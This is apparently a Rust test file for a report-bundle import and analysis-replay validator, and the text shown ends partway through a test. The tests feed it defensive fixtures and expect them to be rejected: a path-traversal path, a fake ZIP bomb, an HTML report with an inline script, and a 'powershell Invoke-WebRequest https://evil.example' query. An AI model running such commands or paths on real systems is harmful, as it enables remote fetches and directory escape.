#![forbid(unsafe_code)]
#![deny(clippy::indexing_slicing, clippy::unwrap_used, clippy::expect_used)]

use oia_export::bundle::{
    AnalysisLicenseStatus, AnalysisReplayOutcome, AnalysisReplayRequest, AssetUseConditions,
    BundleEntryRole, BundleError, BundleImportInput, BundleLimitKind, BundleLimits,
    BundleManifestEntry, BundleOmissionEntry, BundleRecordEntry, BundleRecordKind, BundleReference,
    BundleReferenceTarget, CalibrationValidity, CandidateReplayOutput, CapabilityDeclaration,
    CapabilityKind, CapabilityRequirement, ImportedReportHandling, LocalAuthorityGrant,
    NonReplayableReason, OptionalRecordHandling, PackageIdentity, PinnedAnalysisSpec,
    PinnedCalibrationSpec, PinnedQuerySpec, RedistributionCondition, ReplayContract,
    RetentionCondition, SUPPORTED_BUNDLE_FORMAT, SUPPORTED_BUNDLE_FORMAT_VERSION,
    StagedFilesystemEntryKind, StagedPayloadFile, SupportedCapabilities, replay_analysis,
    sha256_hex, validate_and_stage_bundle,
};
use oia_export::{
    OmissionReason, OriginClass, ReviewStatus, StopReason, TimeDisplay, TimePrecision,
};

const REPORT_V1: &[u8] = include_bytes!("../../../fixtures/documents/a03/originals/report-v1.txt");
const REPORT_V2: &[u8] = include_bytes!("../../../fixtures/documents/a03/originals/report-v2.txt");

fn utc_time(text: &'static str) -> TimeDisplay<'static> {
    TimeDisplay {
        text,
        precision: TimePrecision::ExactInstant,
        time_reference: "UTC",
    }
}

/// Verifies FIPS 180-4 SHA-256 vectors, staged bundle integrity, duplicate-byte record separation,
/// local workspace namespace mapping, origin actor authority stripping, and inert report handling
/// (`REPRO-01`, `REPRO-02`, `A17`, `docs/contracts/report-export.md` §§5–6).
#[test]
fn validates_bundle_hashes_maps_local_namespace_and_keeps_duplicate_byte_records_distinct() {
    assert_eq!(
        sha256_hex(b""),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
    assert_eq!(
        sha256_hex(b"abc"),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert_eq!(
        sha256_hex(b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"),
        "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
    );

    let v1_sha = sha256_hex(REPORT_V1);
    let v2_sha = sha256_hex(REPORT_V2);
    let v1_path = format!("assets/{v1_sha}.txt");
    let v2_path = format!("assets/{v2_sha}.txt");
    let records_bytes = b"{\"records\":3}";
    let records_sha = sha256_hex(records_bytes);
    let html_report_bytes = b"<!doctype html><title>Bundled Report</title><script>evil()</script>";
    let html_report_sha = sha256_hex(html_report_bytes);

    let capabilities = [
        CapabilityDeclaration {
            capability_id: "oia.record.evidence",
            kind: CapabilityKind::RecordSchema,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.optional.future- telemetry",
            kind: CapabilityKind::RecordSchema,
            version: 2,
            requirement: CapabilityRequirement::Optional,
        },
    ];

    let manifest_entries = [
        BundleManifestEntry {
            relative_path: "records/records.json",
            role: BundleEntryRole::Records,
            media_type: "application/json",
            declared_byte_len: records_bytes.len(),
            declared_sha256_hex: &records_sha,
            schema_version: Some(1),
        },
        BundleManifestEntry {
            relative_path: &v1_path,
            role: BundleEntryRole::Assets,
            media_type: "text/plain; charset=utf-8",
            declared_byte_len: REPORT_V1.len(),
            declared_sha256_hex: &v1_sha,
            schema_version: None,
        },
        BundleManifestEntry {
            relative_path: &v2_path,
            role: BundleEntryRole::Assets,
            media_type: "text/plain; charset=utf-8",
            declared_byte_len: REPORT_V2.len(),
            declared_sha256_hex: &v2_sha,
            schema_version: None,
        },
        BundleManifestEntry {
            relative_path: "reports/rendered.html",
            role: BundleEntryRole::Reports,
            media_type: "text/html; charset=utf-8",
            declared_byte_len: html_report_bytes.len(),
            declared_sha256_hex: &html_report_sha,
            schema_version: Some(1),
        },
    ];

    let staged_files = [
        StagedPayloadFile {
            relative_path: "records/records.json",
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: records_bytes,
            rechecked_sha256_hex: Some(&records_sha),
        },
        StagedPayloadFile {
            relative_path: &v1_path,
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: REPORT_V1,
            rechecked_sha256_hex: Some(&v1_sha),
        },
        StagedPayloadFile {
            relative_path: &v2_path,
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: REPORT_V2,
            rechecked_sha256_hex: Some(&v2_sha),
        },
        StagedPayloadFile {
            relative_path: "reports/rendered.html",
            entry_kind: StagedFilesystemEntryKind::RegularFile,
            staged_bytes: html_report_bytes,
            rechecked_sha256_hex: Some(&html_report_sha),
        },
    ];

    let use_conditions = [AssetUseConditions {
        asset_path: &v1_path,
        source_id: "src:harbor-dispatch",
        ordinary_access_method: "Public archive HTTP download",
        attribution_notice: "Harbor log v1",
        automated_processing_permitted: true,
        retention: RetentionCondition::Permitted,
        redistribution: RedistributionCondition::PermittedWithAttribution,
    }];

    let records = [
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "doc:report-original",
            version_id: "ver:v1",
            kind: BundleRecordKind::SourceDocument,
            origin_class: OriginClass::Observation,
            review_status: ReviewStatus::Reviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: utc_time("2026-03-14T22:15:00Z"),
            uncertainty_note: None,
            asset_relative_path: Some(&v1_path),
            required_capability_id: Some("oia.record.evidence"),
        },
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "doc:report-mirror-republication",
            version_id: "ver:mirror-v1",
            kind: BundleRecordKind::SourceDocument,
            origin_class: OriginClass::SourceAssertion,
            review_status: ReviewStatus::Reviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: TimeDisplay {
                text: "2026-03-15",
                precision: TimePrecision::DateOnly,
                time_reference: "UTC",
            },
            uncertainty_note: Some("Identical bytes from secondary mirror"),
            asset_relative_path: Some(&v1_path),
            required_capability_id: Some("oia.record.evidence"),
        },
        BundleRecordEntry {
            origin_namespace: "ws:origin-alpha",
            record_id: "rec:optional-telemetry",
            version_id: "ver:opt-01",
            kind: BundleRecordKind::Annotation,
            origin_class: OriginClass::Observation,
            review_status: ReviewStatus::Unreviewed,
            origin_actor_id: "owner:remote-admin",
            recorded_time: utc_time("2026-03-15T01:00:00Z"),
            uncertainty_note: None,
            asset_relative_path: Some(&v2_path),
            required_capability_id: Some("oia.optional.future- telemetry"),
        },
    ];

    let references = [BundleReference {
        reference_id: "ref:mirror-repeats-orig",
        from_record_id: "doc:report-mirror-republication",
        from_version_id: "ver:mirror-v1",
        relation: "repeats-source",
        target: BundleReferenceTarget::IncludedRecord {
            target_record_id: "doc:report-original",
            target_version_id: "ver:v1",
        },
    }];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:test-01",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:local-new-01",
        local_namespace_prefix: "ws:dest-01",
        existing_case_ids: &["case:existing-99"],
        capabilities: &capabilities,
        manifest_entries: &manifest_entries,
        staged_files: &staged_files,
        use_conditions: &use_conditions,
        records: &records,
        references: &references,
        omissions: &[],
        queries: &[],
        groupings: &[],
        calibrations: &[],
        forecasts: &[],
        analyses: &[],
    };

    let supported = SupportedCapabilities {
        supported: &[("oia.record.evidence", 1)],
        allow_inert_optional_records: true,
    };

    let res =
        validate_and_stage_bundle(
            &input,
            &supported,
            BundleLimits::default_limits(),
            || Ok(()),
        );
    assert!(res.is_ok(), "expected valid bundle, got {res:?}");
    let Ok(bundle) = res else {
        return;
    };

    assert!(bundle.inert_import_verified());
    assert_eq!(
        bundle.omitted_optional_capabilities(),
        &["oia.optional.future- telemetry".to_owned()]
    );
    assert_eq!(bundle.mapped_records().len(), 3);

    let Some(first) = bundle.mapped_records().first() else {
        return;
    };
    let Some(second) = bundle.mapped_records().get(1) else {
        return;
    };
    let Some(third) = bundle.mapped_records().get(2) else {
        return;
    };

    // Identical asset SHA-256 bytes, but distinct origin and mapped local identities.
    assert_eq!(first.asset_sha256_hex, second.asset_sha256_hex);
    assert_ne!(first.origin_record_id, second.origin_record_id);
    assert_ne!(first.local_record_id, second.local_record_id);
    assert_ne!(first.local_version_id, second.local_version_id);
    assert_eq!(first.local_record_id, "ws:dest-01/rec/doc:report-original");
    assert_eq!(
        second.local_record_id,
        "ws:dest-01/rec/doc:report-mirror-republication"
    );

    // Imported actor names never confer local authority.
    assert_eq!(
        first.attributed_actor.local_authority,
        LocalAuthorityGrant::None
    );
    assert_eq!(first.attributed_actor.origin_namespace, "ws:origin-alpha");

    // Unsupported optional capability record is retained as inert opaque bytes rather than executed.
    assert_eq!(
        third.optional_handling,
        OptionalRecordHandling::RetainedInertOpaqueBytes {
            capability_id: "oia.optional.future- telemetry".to_owned(),
        }
    );

    // Bundled readable report under reports/ is flagged as untrusted requiring regeneration or inert viewer.
    let report_entry = bundle
        .verified_entries()
        .iter()
        .find(|e| e.relative_path == "reports/rendered.html");
    assert!(report_entry.is_some());
    if let Some(rep) = report_entry {
        assert_eq!(
            rep.report_handling,
            Some(ImportedReportHandling::UntrustedRequiresRegenerationOrInertViewer)
        );
    }
}

/// Verifies rejection of path traversal, Windows reserved device names, case-insensitive path
/// collisions, non-regular filesystem entries (symlinks/reparse points), archive/compressed
/// containers, corrupt asset hashes, mid-staging mutation, and forbidden side-effect hooks
/// (`REPRO-02`, `A17`, `docs/contracts/report-export.md` §6).
#[test]
fn rejects_traversal_windows_devices_symlinks_archives_corrupt_hashes_and_side_effects() {
    let payload = b"{\"ok\":true}";
    let payload_sha = sha256_hex(payload);

    let base_entry = BundleManifestEntry {
        relative_path: "records/ok.json",
        role: BundleEntryRole::Records,
        media_type: "application/json",
        declared_byte_len: payload.len(),
        declared_sha256_hex: &payload_sha,
        schema_version: Some(1),
    };
    let base_staged = StagedPayloadFile {
        relative_path: "records/ok.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: payload,
        rechecked_sha256_hex: Some(&payload_sha),
    };

    fn make_input<'a>(
        entries: &'a [BundleManifestEntry<'a>],
        staged: &'a [StagedPayloadFile<'a>],
    ) -> BundleImportInput<'a> {
        BundleImportInput {
            identity: PackageIdentity {
                format: SUPPORTED_BUNDLE_FORMAT,
                format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
                package_id: "pkg:adversarial",
                created_time: utc_time("2026-11-02T18:00:00Z"),
                producer_id: "oia-test",
                producer_version: "0.1.0",
            },
            destination_case_id: "case:dest",
            local_namespace_prefix: "ws:dest",
            existing_case_ids: &[],
            capabilities: &[],
            manifest_entries: entries,
            staged_files: staged,
            use_conditions: &[],
            records: &[],
            references: &[],
            omissions: &[],
            queries: &[],
            groupings: &[],
            calibrations: &[],
            forecasts: &[],
            analyses: &[],
        }
    }
    let supported = SupportedCapabilities {
        supported: &[],
        allow_inert_optional_records: false,
    };
    let limits = BundleLimits::default_limits();

    // 1. Path traversal `..`
    let traversal_entries = [BundleManifestEntry {
        relative_path: "records/../escape.json",
        ..base_entry
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&traversal_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InvalidRelativePath { .. })
    ));

    // 2. Windows reserved device name `COM1.json`
    let device_entries = [BundleManifestEntry {
        relative_path: "records/COM1.json",
        ..base_entry
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&device_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InvalidRelativePath { .. })
    ));

    // 3. Case-insensitive path collision
    let collision_entries = [
        BundleManifestEntry {
            relative_path: "records/Item.json",
            ..base_entry
        },
        BundleManifestEntry {
            relative_path: "records/item.json",
            ..base_entry
        },
    ];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&collision_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::CaseInsensitivePathCollision { .. })
    ));

    // 4. Symlink / reparse point rejection
    let symlink_entries = [base_entry];
    let symlink_staged = [StagedPayloadFile {
        entry_kind: StagedFilesystemEntryKind::Symlink,
        ..base_staged
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&symlink_entries, &symlink_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::UnsafeFilesystemEntry {
            entry_kind: StagedFilesystemEntryKind::Symlink,
            ..
        })
    ));

    // 5. Compressed bomb / ZIP magic header rejection without unpacking
    let zip_bytes = b"PK\x03\x04fake-zip-bomb-payload";
    let zip_sha = sha256_hex(zip_bytes);
    let zip_entries = [BundleManifestEntry {
        relative_path: "records/ disguised.json",
        declared_byte_len: zip_bytes.len(),
        declared_sha256_hex: &zip_sha,
        ..base_entry
    }];
    // Note: leading space in component also rejected; test clean path with ZIP magic bytes:
    let clean_zip_entries = [BundleManifestEntry {
        relative_path: "records/payload.json",
        declared_byte_len: zip_bytes.len(),
        declared_sha256_hex: &zip_sha,
        ..base_entry
    }];
    let clean_zip_staged = [StagedPayloadFile {
        relative_path: "records/payload.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: zip_bytes,
        rechecked_sha256_hex: None,
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&zip_entries, &[]),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InvalidRelativePath { .. })
    ));
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&clean_zip_entries, &clean_zip_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::ArchiveContainerRejected { .. })
    ));

    // 6. Corrupt asset bytes (never silently downgraded to missing)
    let corrupt_staged = [StagedPayloadFile {
        relative_path: "records/ok.json",
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: b"{\"ok\":0000}",
        rechecked_sha256_hex: None,
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&[base_entry], &corrupt_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::IntegrityHashMismatch { .. })
    ));

    // 7. Mid-staging input mutation (`InputChangedDuringStaging`)
    let mutated_sha = sha256_hex(b"different-bytes");
    let mutated_staged = [StagedPayloadFile {
        rechecked_sha256_hex: Some(&mutated_sha),
        ..base_staged
    }];
    assert!(matches!(
        validate_and_stage_bundle(
            &make_input(&[base_entry], &mutated_staged),
            &supported,
            limits,
            || Ok(())
        ),
        Err(BundleError::InputChangedDuringStaging { .. })
    ));

    // 8. Forbidden executable hook in reproduction query
    let ok_entries = [base_entry];
    let ok_staged = [base_staged];
    let mut hook_input = make_input(&ok_entries, &ok_staged);
    let bad_queries = [PinnedQuerySpec {
        query_id: "query:bad",
        version_id: "ver:q1",
        query_expression: "powershell -Command Invoke-WebRequest https://evil.example",
        pinned_input_versions: &[],
        coverage_note: "test",
    }];
    hook_input.queries = &bad_queries;
    assert!(matches!(
        validate_and_stage_bundle(&hook_input, &supported, limits, || Ok(())),
        Err(BundleError::ForbiddenBundleSideEffect { .. })
    ));
}

/// Verifies deterministic bitwise replay, numerical-tolerance replay, and honest non-replayable
/// reporting for missing/mismatched models, omitted sources, invalidated calibrations, changed
/// licenses, stochastic outputs, and unsupported capabilities (`REPRO-03`, `A17`).
#[test]
fn verifies_bitwise_and_tolerance_replay_and_reports_non_replayable_reasons_honestly() {
    let v1_sha = sha256_hex(REPORT_V1);
    let v1_path = format!("assets/{v1_sha}.txt");
    let expected_out = b"exact-deterministic-output-v1";
    let expected_out_sha = sha256_hex(expected_out);
    let expected_series = [10.0, 20.0, 30.0];

    let capabilities = [
        CapabilityDeclaration {
            capability_id: "oia.record.evidence",
            kind: CapabilityKind::RecordSchema,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.analysis.core",
            kind: CapabilityKind::AnalysisMethod,
            version: 1,
            requirement: CapabilityRequirement::Required,
        },
        CapabilityDeclaration {
            capability_id: "oia.analysis.future-gpu-solver",
            kind: CapabilityKind::AnalysisMethod,
            version: 2,
            requirement: CapabilityRequirement::Optional,
        },
    ];

    let manifest_entries = [BundleManifestEntry {
        relative_path: &v1_path,
        role: BundleEntryRole::Assets,
        media_type: "text/plain",
        declared_byte_len: REPORT_V1.len(),
        declared_sha256_hex: &v1_sha,
        schema_version: None,
    }];
    let staged_files = [StagedPayloadFile {
        relative_path: &v1_path,
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: REPORT_V1,
        rechecked_sha256_hex: Some(&v1_sha),
    }];

    let records = [BundleRecordEntry {
        origin_namespace: "ws:alpha",
        record_id: "doc:v1",
        version_id: "ver:1",
        kind: BundleRecordKind::SourceDocument,
        origin_class: OriginClass::Observation,
        review_status: ReviewStatus::Reviewed,
        origin_actor_id: "actor:1",
        recorded_time: utc_time("2026-03-14T22:15:00Z"),
        uncertainty_note: None,
        asset_relative_path: Some(&v1_path),
        required_capability_id: Some("oia.record.evidence"),
    }];

    let omissions = [BundleOmissionEntry {
        omitted_id: "doc:restricted-radar",
        source_id: "src:radar",
        version_id: "ver:radar-1",
        reason: OmissionReason::Restricted,
        coverage_effect: "Restricted radar track omitted",
        unreproducible_step_note: Some("Requires restricted source"),
    }];

    let calibrations = [
        PinnedCalibrationSpec {
            calibration_id: "cal:valid",
            version_id: "ver:c1",
            sensor_or_view_id: "cam:1",
            reference_description: "Star field",
            residual_rms: 0.15,
            residual_unit: "arcsec",
            validity: CalibrationValidity::Valid,
        },
        PinnedCalibrationSpec {
            calibration_id: "cal:moved",
            version_id: "ver:c2",
            sensor_or_view_id: "cam:2",
            reference_description: "Displaced tripod",
            residual_rms: 0.40,
            residual_unit: "arcsec",
            validity: CalibrationValidity::Invalidated {
                reason: "Camera bumped after calibration",
            },
        },
    ];

    let avail_inputs = [("doc:v1", "ver:1")];
    let omitted_inputs = [("doc:restricted-radar", "ver:radar-1")];
    let asset_paths = [v1_path.as_str()];

    let analyses = [
        PinnedAnalysisSpec {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            method_id: "method:exact",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=exact",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "MIT OR Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: &expected_out_sha,
                expected_byte_len: expected_out.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            method_id: "method:numeric",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: Some("model:regressor"),
            model_version: Some("v1.2.0"),
            configuration_summary: "solver=rk4",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: Some(("cal:valid", "ver:c1")),
            replay_contract: ReplayContract::NumericalTolerance {
                expected_series: &expected_series,
                max_abs_diff: 0.05,
                max_rel_diff: 0.005,
                tolerance_justification: "Floating-point reduction tolerance",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:omitted-source",
            version_id: "ver:a3",
            method_id: "method:radar-track",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "filter=kalman",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &omitted_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: &expected_out_sha,
                expected_byte_len: expected_out.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:invalid-cal",
            version_id: "ver:a4",
            method_id: "method:triangulate",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "views=2",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &asset_paths,
            calibration_ref: Some(("cal:moved", "ver:c2")),
            replay_contract: ReplayContract::NumericalTolerance {
                expected_series: &expected_series,
                max_abs_diff: 0.05,
                max_rel_diff: 0.005,
                tolerance_justification: "Triangulation tolerance",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:license-changed",
            version_id: "ver:a5",
            method_id: "method:proprietary",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=std",
            license_status: AnalysisLicenseStatus::ChangedOrIncompatible {
                detail: "Upstream model weights license revoked offline redistribution",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: &expected_out_sha,
                expected_byte_len: expected_out.len(),
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:stochastic",
            version_id: "ver:a6",
            method_id: "method:sampling",
            required_capability_id: "oia.analysis.core",
            required_capability_version: 1,
            model_id: None,
            model_version: None,
            configuration_summary: "temp=0.8",
            license_status: AnalysisLicenseStatus::Compatible {
                license_id: "Apache-2.0",
            },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::NonReplayableStochastic {
                reason: "Unseeded hardware RNG sampling",
            },
        },
        PinnedAnalysisSpec {
            analysis_id: "ana:unsupported-cap",
            version_id: "ver:a7",
            method_id: "method:gpu",
            required_capability_id: "oia.analysis.future-gpu-solver",
            required_capability_version: 2,
            model_id: None,
            model_version: None,
            configuration_summary: "mode=gpu",
            license_status: AnalysisLicenseStatus::Compatible { license_id: "MIT" },
            pinned_input_versions: &avail_inputs,
            pinned_asset_paths: &[],
            calibration_ref: None,
            replay_contract: ReplayContract::DeterministicBitwise {
                expected_output_sha256_hex: &expected_out_sha,
                expected_byte_len: expected_out.len(),
            },
        },
    ];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:replay-suite",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:replay-01",
        local_namespace_prefix: "ws:replay",
        existing_case_ids: &[],
        capabilities: &capabilities,
        manifest_entries: &manifest_entries,
        staged_files: &staged_files,
        use_conditions: &[],
        records: &records,
        references: &[],
        omissions: &omissions,
        queries: &[],
        groupings: &[],
        calibrations: &calibrations,
        forecasts: &[],
        analyses: &analyses,
    };

    let supported = SupportedCapabilities {
        supported: &[("oia.record.evidence", 1), ("oia.analysis.core", 1)],
        allow_inert_optional_records: true,
    };
    let limits = BundleLimits::default_limits();
    let Ok(bundle) = validate_and_stage_bundle(&input, &supported, limits, || Ok(())) else {
        return;
    };

    // 1. Bitwise exact match and divergence
    let bw_ok = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            available_models: &[],
            candidate_output: CandidateReplayOutput::Bytes(expected_out),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        bw_ok,
        Ok(AnalysisReplayOutcome::ReproducedBitwise { .. })
    ));

    let bw_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:bitwise",
            version_id: "ver:a1",
            available_models: &[],
            candidate_output: CandidateReplayOutput::Bytes(b"different-bytes"),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        bw_div,
        Ok(AnalysisReplayOutcome::DivergedBitwise { .. })
    ));

    // 2. Numerical tolerance match, divergence, and missing/mismatched model
    let tol_ok = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[10.02, 19.98, 30.01]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_ok,
        Ok(AnalysisReplayOutcome::ReproducedWithinTolerance { .. })
    ));

    let tol_div = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v1.2.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&[10.0, 21.5, 30.0]),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        tol_div,
        Ok(AnalysisReplayOutcome::DivergedBeyondTolerance {
            first_failing_index: 1,
            ..
        })
    ));

    let wrong_model = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:tolerance",
            version_id: "ver:a2",
            available_models: &[("model:regressor", "v2.0.0")],
            candidate_output: CandidateReplayOutput::NumericalSeries(&expected_series),
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        wrong_model,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::MissingOrMismatchedModel {
                available_version: Some(_),
                ..
            },
            ..
        })
    ));

    // 3. Unavailable/omitted source
    let omitted_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:omitted-source",
            version_id: "ver:a3",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        omitted_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::UnavailableSource {
                reason: Some(OmissionReason::Restricted),
                ..
            },
            ..
        })
    ));

    // 4. Invalidated calibration
    let cal_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:invalid-cal",
            version_id: "ver:a4",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        cal_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::InvalidatedCalibration { .. },
            ..
        })
    ));

    // 5. Changed/incompatible license
    let lic_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:license-changed",
            version_id: "ver:a5",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        lic_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::ChangedOrIncompatibleLicense { .. },
            ..
        })
    ));

    // 6. Stochastic output
    let stoch_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:stochastic",
            version_id: "ver:a6",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        stoch_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::StochasticOutput { .. },
            ..
        })
    ));

    // 7. Unsupported optional analysis capability
    let cap_res = replay_analysis(
        &bundle,
        &AnalysisReplayRequest {
            analysis_id: "ana:unsupported-cap",
            version_id: "ver:a7",
            available_models: &[],
            candidate_output: CandidateReplayOutput::NotExecuted,
        },
        limits,
        || Ok(()),
    );
    assert!(matches!(
        cap_res,
        Ok(AnalysisReplayOutcome::NonReplayable {
            reason: NonReplayableReason::UnsupportedCapability { .. },
            ..
        })
    ));
}

/// Verifies resource budget enforcement, existing-case overwrite protection, and cooperative
/// cancellation (`REPRO-02`, `AGENTS.md` §5).
#[test]
fn enforces_bundle_resource_budgets_case_overwrite_guard_and_cooperative_stops() {
    assert_eq!(
        BundleLimits::new(0, 1, 1, 1, 1, 1, 1, 1, 1, 1),
        Err(BundleError::ZeroLimit(BundleLimitKind::Capabilities))
    );
    assert_eq!(
        BundleLimits::new(1, 1, 1, 1, 1, 1, 0, 1, 1, 1),
        Err(BundleError::ZeroLimit(BundleLimitKind::FileBytes))
    );

    let v1_sha = sha256_hex(REPORT_V1);
    let v1_path = format!("assets/{v1_sha}.txt");
    let entries = [BundleManifestEntry {
        relative_path: &v1_path,
        role: BundleEntryRole::Assets,
        media_type: "text/plain",
        declared_byte_len: REPORT_V1.len(),
        declared_sha256_hex: &v1_sha,
        schema_version: None,
    }];
    let staged = [StagedPayloadFile {
        relative_path: &v1_path,
        entry_kind: StagedFilesystemEntryKind::RegularFile,
        staged_bytes: REPORT_V1,
        rechecked_sha256_hex: None,
    }];

    let input = BundleImportInput {
        identity: PackageIdentity {
            format: SUPPORTED_BUNDLE_FORMAT,
            format_version: SUPPORTED_BUNDLE_FORMAT_VERSION,
            package_id: "pkg:limits",
            created_time: utc_time("2026-11-02T18:00:00Z"),
            producer_id: "oia-test",
            producer_version: "0.1.0",
        },
        destination_case_id: "case:already-exists",
        local_namespace_prefix: "ws:test",
        existing_case_ids: &["case:already-exists"],
        capabilities: &[],
        manifest_entries: &entries,
        staged_files: &staged,
        use_conditions: &[],
        records: &[],
        references: &[],
        omissions: &[],
        queries: &[],
        groupings: &[],
        calibrations: &[],
        forecasts: &[],
        analyses: &[],
    };
    let supported = SupportedCapabilities {
        supported: &[],
        allow_inert_optional_records: false,
    };

    // Refuses to overwrite an existing case ID.
    assert_eq!(
        validate_and_stage_bundle(
            &input,
            &supported,
            BundleLimits::default_limits(),
            || Ok(())
        ),
        Err(BundleError::ExistingCaseOverwriteRefused {
            destination_case_id: "case:already-exists".to_owned(),
        })
    );

    // Enforces tight file-byte budget.
